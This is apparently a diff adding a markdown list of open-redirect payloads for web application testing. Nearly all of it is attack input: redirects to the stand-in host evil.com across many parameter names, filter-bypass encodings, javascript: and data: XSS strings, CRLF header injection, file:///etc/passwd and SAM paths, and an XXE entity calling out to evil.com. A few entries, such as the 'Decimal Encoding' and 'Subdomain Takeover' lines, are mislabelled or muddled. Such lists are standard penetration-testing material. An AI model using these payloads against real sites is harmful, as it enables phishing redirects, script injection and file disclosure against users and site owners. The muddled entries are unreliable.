@@ -1,0 +1,222 @@
+# Open Redirect Payloads
+
+## Basic External URLs
+http://evil.com
+https://evil.com
+//evil.com
+///evil.com
+////evil.com
+http://evil.com/
+https://evil.com/
+//evil.com/
+
+## Common Parameter Names to Test
+?url=http://evil.com
+?redirect=http://evil.com
+?next=http://evil.com
+?return=http://evil.com
+?continue=http://evil.com
+?destination=http://evil.com
+?redir=http://evil.com
+?returnTo=http://evil.com
+?returnUrl=http://evil.com
+?redirectUrl=http://evil.com
+?redirect_uri=http://evil.com
+?callback=http://evil.com
+?return_to=http://evil.com
+?goto=http://evil.com
+?target=http://evil.com
+?link=http://evil.com
+?out=http://evil.com
+?view=http://evil.com
+?to=http://evil.com
+?image_url=http://evil.com
+?go=http://evil.com
+?file=http://evil.com
+?val=http://evil.com
+?validate=http://evil.com
+?domain=http://evil.com
+?checkout_url=http://evil.com
+?success=http://evil.com
+?failure=http://evil.com
+?login=http://evil.com
+?logout=http://evil.com
+
+## Protocol Manipulation
+///evil.com
+////evil.com
+/////evil.com
+\\evil.com
+\\\\evil.com
+\/\/evil.com
+/\/\/evil.com
+
+## Using @ Symbol
+http://legitimate.com@evil.com
+https://legitimate.com@evil.com
+//legitimate.com@evil.com
+http://legitimate.com%40evil.com
+
+## URL Encoding
+http%3A%2F%2Fevil.com
+https%3A%2F%2Fevil.com
+%2F%2Fevil.com
+http%3A%2F%2Fevil%2Ecom
+https%3A%2F%2Fevil%2Ecom
+
+## Double URL Encoding
+http%253A%252F%252Fevil.com
+https%253A%252F%252Fevil.com
+%252F%252Fevil.com
+
+## Unicode/UTF-8 Encoding
+http://evil%E3%80%82com
+//evil%E3%80%82com
+//evil%u2215com
+//evil%u2216com
+
+## Null Byte Bypass
+http://evil.com%00.legitimate.com
+https://evil.com%00.legitimate.com
+//evil.com%00.legitimate.com
+
+## Whitespace Bypass
+http://evil.com%20
+http://evil.com%09
+http://evil.com%0a
+http://evil.com%0d
+
+## Using Localhost/Internal IPs
+http://127.0.0.1
+http://localhost
+http://0.0.0.0
+http://[::1]
+http://2130706433 (decimal IP)
+http://0x7f000001 (hex IP)
+
+## Domain Manipulation
+http://evil.com.legitimate.com
+http://legitimate.com.evil.com
+http://evil-legitimate.com
+http://legitimate-evil.com
+
+## Subdomain Takeover
+http://subdomain.legitimate.com
+//subdomain.legitimate.com
+
+## XSS via Redirect (javascript: protocol)
+javascript:alert(1)
+javascript:alert('XSS')
+javascript://evil.com%0Aalert(1)
+javascript:eval(atob('YWxlcnQoMSk='))
+
+## Data URI
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+
+## File Protocol
+file:///etc/passwd
+file://C:/Windows/System32/config/sam
+
+## Wildcard Bypasses
+http://evil*.com
+http://*.evil.com
+
+## Bypass using Backslash
+http:\\evil.com
+https:\\evil.com
+
+## Using Question Mark
+http://legitimate.com?evil.com
+http://legitimate.com?@evil.com
+
+## Using Hash
+http://legitimate.com#evil.com
+http://legitimate.com#@evil.com
+
+## Bypass with Partial URL
+evil.com
+//evil.com
+///evil.com
+
+## Using Different TLDs
+http://evil.co
+http://evil.io
+http://evil.net
+http://evil.org
+
+## CRLF Injection for Header Manipulation
+%0d%0aLocation:%20http://evil.com
+%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:text/html%0d%0aContent-Length:25%0d%0a%0d%0a<script>alert(1)</script>
+%0aLocation:%20http://evil.com
+
+## IPv6 Addresses
+http://[::ffff:7f00:1]
+http://[0:0:0:0:0:ffff:127.0.0.1]
+
+## Punycode/IDN Homograph
+http://xn--e1awd7f.com (example using Cyrillic characters)
+http://xn--80a7a.com
+
+## Using Subpaths
+http://legitimate.com/redirect?url=http://evil.com
+http://legitimate.com/redirect?url=//evil.com
+http://legitimate.com/redirect?url=///evil.com
+
+## Combined Techniques
+http://legitimate.com@evil.com?redirect=http://evil.com
+//legitimate.com@evil.com%2F
+http://evil.com%23legitimate.com
+http://evil.com%3Flegitimate.com
+
+## Special Characters
+http://evil。com (using Unicode dot)
+http://evil。com (using full-width dot)
+http://evil%E3%80%82com
+
+## Bypass with URL Fragments
+#http://evil.com
+#//evil.com
+
+## Using Meta Refresh
+<meta http-equiv="refresh" content="0;url=http://evil.com">
+
+## Mixed Case to Bypass Filters
+HTtp://evil.com
+HttPs://evil.com
+hTTp://evil.com
+
+## Decimal Encoding
+http://1.2.3.4 (where 1.2.3.4 is the decimal representation)
+
+## Octal Encoding
+http://0177.0.0.01 (octal for 127.0.0.1)
+
+## Using Port Numbers
+http://evil.com:80
+http://evil.com:443
+http://evil.com:8080
+
+## Path Confusion
+/http://evil.com
+\/http://evil.com
+//http://evil.com
+
+## Relative Path Manipulation
+../../../evil.com
+..%2F..%2F..%2Fevil.com
+
+## Using Open Graph Protocol
+http://legitimate.com/og?image=http://evil.com/image.jpg
+
+## Flash-based Redirect
+http://legitimate.com/flash.swf?url=http://evil.com
+
+## PDF-based Redirect
+http://legitimate.com/file.pdf#http://evil.com
+
+## Using Referrer Header
+Referer: http://evil.com
+
+## XML External Entity (XXE) for Redirect
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com">]><foo>&xxe;</foo>
